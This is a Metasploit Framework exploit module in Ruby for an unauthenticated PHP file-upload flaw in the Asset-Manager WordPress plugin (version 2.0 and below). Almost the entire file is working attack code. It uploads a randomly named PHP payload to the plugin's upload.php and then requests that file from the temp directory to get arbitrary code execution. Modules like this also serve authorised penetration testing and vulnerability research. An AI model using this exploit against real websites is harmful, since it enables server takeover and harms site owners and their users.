##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
require 'msf/core/exploit/php_exe'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::PhpEXE
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'WordPress Asset-Manager PHP File Upload Vulnerability',
            'Description'    => %q{
                This module exploits a vulnerability found in Asset-Manager <= 2.0   WordPress
                plugin.  By abusing the upload.php file, a malicious user can upload a file to a
                temp directory without authentication, which results in arbitrary code execution.
            },
            'Author'         =>
                [
                    'Sammy FORGIT', # initial discovery
                    'James Fitts <fitts.james[at]gmail.com>' # metasploit module
                ],
            'License'        => MSF_LICENSE,
            'References'     =>
                [
                    [ 'OSVDB', '82653' ],
                    [ 'BID', '53809' ],
                    [ 'EDB', '18993' ],
                    [ 'URL', 'http://www.opensyscom.fr/Actualites/wordpress-plugins-asset-manager-shell-upload-vulnerability.html' ]
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00",
                },
            'Platform'       => 'php',
            'Arch'           => ARCH_PHP,
            'Targets'        =>
                [
                    [ 'Generic (PHP Payload)', { 'Arch' => ARCH_PHP, 'Platform' => 'php' } ],
                    [ 'Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' } ]
                ],
            'DefaultTarget' => 0,
            'DisclosureDate' => 'May 26 2012'))
 
        register_options(
            [
                OptString.new('TARGETURI', [true, 'The full URI path to WordPress', '/wordpress'])
            ], self.class)
    end
 
    def exploit
        uri =  target_uri.path
        uri << '/' if uri[-1,1] != '/'
        peer = "#{rhost}:#{rport}"
        payload_name = "#{rand_text_alpha(5)}.php"
        php_payload = get_write_exec_payload(:unlink_self=>true)
 
        data = Rex::MIME::Message.new
        data.add_part(php_payload, "application/octet-stream", nil, "form-data; name=\"Filedata\"; filename=\"#{payload_name}\"")
        post_data = data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')
 
        print_status("#{peer} - Uploading payload #{payload_name}")
        res = send_request_cgi({
            'method'  => 'POST',
            'uri'     => "#{uri}wp-content/plugins/asset-manager/upload.php",
            'ctype'   => "multipart/form-data; boundary=#{data.bound}",
            'data'    => post_data
        })
 
        if not res or res.code != 200 or res.body !~ /#{payload_name}/
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Upload failed")
        end
 
        print_status("#{peer} - Executing payload #{payload_name}")
        res = send_request_raw({
            'uri'     => "#{uri}wp-content/uploads/assets/temp/#{payload_name}",
            'method'  => 'GET'
        })
 
        if res and res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "#{peer} - Execution failed")
        end
    end
end
